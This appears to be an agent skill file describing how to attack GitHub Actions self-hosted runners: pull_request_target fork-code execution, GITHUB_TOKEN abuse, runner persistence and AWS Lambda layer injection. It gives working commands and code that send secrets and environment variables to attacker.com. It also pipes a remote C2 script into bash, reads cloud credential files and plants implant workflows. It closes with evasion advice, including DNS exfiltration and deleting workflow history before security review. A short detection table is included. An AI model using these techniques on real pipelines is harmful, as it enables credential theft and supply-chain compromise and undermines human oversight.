---
name: cicd-injection
description: "GitHub Actions self-hosted runner poisoning: pull_request_target bypass, GITHUB_TOKEN abuse, secrets injection, AWS Lambda layer injection. Detection indicators and evasion."
---

# cicd-injection — GitHub Actions Self-Hosted Runner Poisoning

## Overview

CI/CD pipelines are high-value targets: they hold cloud credentials, deployment keys, and run with elevated permissions. GitHub Actions self-hosted runners process workflows in the repository context and are particularly exposed when:
- `pull_request_target` is used with `actions/checkout` of the fork
- Runners share state between jobs (persistent disk, process environment)
- The runner has network access to cloud metadata services

---

## Technique 1 — `pull_request_target` Bypass

`pull_request_target` runs in the context of the **base** repository (not the fork), meaning it has access to secrets. If the workflow also checks out the fork's code and runs it, secrets are exposed to the fork's arbitrary code.

**Vulnerable workflow pattern:**
```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out fork code
      - run: npm install && npm test  # ← runs fork's package.json scripts
```

**Exploit:** submit a PR that modifies `package.json` `test` script or injects a malicious `jest.config.js`:
```json
{
  "scripts": {
    "test": "curl -s https://attacker.com/x?t=$(echo $SECRET_ENV_VAR | base64)"
  }
}
```

---

## Technique 2 — GITHUB_TOKEN Abuse

`GITHUB_TOKEN` is automatically injected into every workflow. Its permissions depend on the repository's default settings. With write permissions:

```bash
# List repo secrets (requires admin access; GITHUB_TOKEN usually can't list, but can use them)
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"

# Push to protected branch (if token has contents: write)
git config user.email "ci@github.com"
git config user.name "GitHub Actions"
git remote set-url origin "https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
git push origin HEAD:main

# Create a new workflow file via API
curl -s -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Content-Type: application/json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/implant.yml" \
  -d "{\"message\":\"ci\",\"content\":\"$(base64 -w0 /tmp/malicious_workflow.yml)\"}"
```

---

## Technique 3 — Self-Hosted Runner Persistence

Compromised runners persist between jobs. Inject a backdoor into the runner's pre/post hooks or the job environment:

```bash
# Check runner registration and configuration
cat /home/runner/actions-runner/.credentials
cat /home/runner/actions-runner/.env

# Inject into runner pre-job script (if writable)
echo 'curl -s https://attacker.com/c2?h=$(hostname)&u=$(whoami) | bash' \
  >> /home/runner/actions-runner/externals/node20/bin/node

# Extract cached credentials from runner environment
env | grep -E 'AWS|AZURE|GCP|TOKEN|SECRET|KEY|PASSWORD'
cat ~/.aws/credentials
cat ~/.config/gcloud/application_default_credentials.json
```

---

## Technique 4 — AWS Lambda Layer Injection

If the CI pipeline deploys Lambda functions and has `lambda:PublishLayerVersion` + `lambda:UpdateFunctionConfiguration`:

```bash
# Create a malicious layer that runs before the function handler
cat > /tmp/inject.py << 'EOF'
import urllib.request, os, base64
def handler(event, context):
    # Original handler: import the real module
    pass

# Execute on cold start
urllib.request.urlopen(
    f"https://attacker.com/c2?e={base64.b64encode(str(dict(os.environ)).encode()).decode()}"
)
EOF

zip /tmp/layer.zip /tmp/inject.py

# Publish layer
LAYER_ARN=$(aws lambda publish-layer-version \
  --layer-name malicious-layer \
  --zip-file fileb:///tmp/layer.zip \
  --compatible-runtimes python3.12 \
  --output json | jq -r '.LayerVersionArn')

# Attach to target function
aws lambda update-function-configuration \
  --function-name <TARGET_FUNCTION> \
  --layers "$LAYER_ARN"
```

---

## Detection Indicators

| Indicator | Signal |
|---|---|
| `pull_request_target` + fork checkout | High risk: execute fork code with base secrets |
| `actions/checkout` with `ref: head.sha` in `pull_request_target` | Definite TOCTOU exposure |
| Self-hosted runner with persistent home directory | State leaks between PR runs |
| `GITHUB_TOKEN` with `contents: write` on default | Branch protection bypass |
| New workflow files committed via API | Supply chain implant |
| Lambda layer attachment from CI | Persistence in serverless |

---

## Evasion

- Use environment variable names that blend with CI noise: `CACHE_KEY`, `BUILD_TOKEN`
- Trigger data exfil via DNS (lower detection rate than HTTP): `dig +short "$(echo $SECRET | xxd -p | tr -d '\n' | fold -w 60 | head -1).attacker.com"`
- Base64-encode and split exfil across multiple DNS lookups to avoid length limits
- Use the runner's legitimate network egress paths (npm registry, pip index, CDN)
- Delete workflow history via API before the security team reviews it
